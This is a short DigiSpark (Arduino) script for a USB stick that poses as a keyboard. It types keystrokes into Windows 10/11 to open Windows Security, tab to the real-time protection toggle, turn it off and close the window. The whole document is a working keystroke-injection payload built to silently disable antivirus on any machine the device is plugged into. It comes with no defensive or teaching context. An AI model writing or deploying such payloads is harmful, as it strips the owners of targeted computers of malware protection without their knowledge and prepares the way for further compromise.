//This DigiSpark script turns off windows defender in windows10/11
#include "DigiKeyboard.h"
void setup() {
//empty
}
void loop(){
   //Turn off Windows Defender
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//open RUN
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Windowsdefender://threat/"); //type windows defender
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  DigiKeyboard.print("\t");//Press TAB 1
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//Press TAB 2
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//Press TAB 3
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//Press TAB 4
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("\t");//Press TAB 6
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//Press TAB 7
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); //close window
  for(;;);
  }
